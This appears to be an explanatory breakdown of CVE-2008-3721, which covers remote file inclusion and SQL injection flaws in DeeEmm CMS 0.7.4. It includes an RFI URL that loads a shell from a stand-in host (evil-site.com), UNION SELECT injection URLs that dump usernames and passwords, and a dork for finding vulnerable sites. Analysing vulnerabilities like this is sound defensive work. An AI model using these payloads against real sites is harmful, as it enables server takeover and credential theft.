Based on the provided content, here's a breakdown of the vulnerabilities associated with CVE-2008-3721:

**Root Cause of Vulnerability:**

*   The vulnerabilities stem from a lack of proper input sanitization within the DeeEmm CMS (dmcms) application.

**Weaknesses/Vulnerabilities Present:**

1.  **Remote File Inclusion (RFI):**
    *   The `user_language.php` script is vulnerable to RFI.
    *   The `language_dir` parameter is not properly sanitized, allowing an attacker to include a remote file.

2.  **SQL Injection:**
    *   The `index.php` script is vulnerable to SQL injection.
    *   The `page` parameter is not properly sanitized, allowing an attacker to inject malicious SQL code.

**Impact of Exploitation:**

*   **RFI:**  An attacker can include a remote malicious script on the server, leading to arbitrary code execution. This could allow them to take control of the server.
*   **SQL Injection:** An attacker can extract sensitive information from the database, such as user credentials. This can lead to unauthorized access and data breaches.

**Attack Vectors:**

*   **RFI:**  By crafting a malicious URL with the `language_dir` parameter pointing to a remote server containing a malicious script.
    *   Example URL: `http://Site/user_language.php?INDM=r3d.w0rm&language_dir=http://evil-site.com/shell.txt?`
*   **SQL Injection:** By manipulating the `page` and `id` parameters with SQL injection payloads.
    *   Example URLs:
        *   `http://Site/index.php?page=media`+union+select+0,1,2,4,5,6,7,8,9,user_name,11,password,13,14,15,16,17,18,19,20,21+from+deeemm_users/*`
        *   `http://Site/index.php?page=media&id=-99999+union+select+0,1,2,4,5,6,7,8,9,user_name,11,password,13,14,15,16,17,18,19,20,21+from+deeemm_users`

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP requests to the vulnerable DeeEmm CMS application.
*   For RFI, the attacker needs a web server to host the malicious script.
*   No specific prior authentication is mentioned as necessary for exploitation.

**Additional Notes:**

*   The provided exploit information includes references to related CVE-2008-3720.
*   The vulnerable application is identified as DeeEmm CMS (dmcms) version 0.7.4.
*   The exploit information includes a dork for searching vulnerable instances: `"DeeEmm CMS"`.
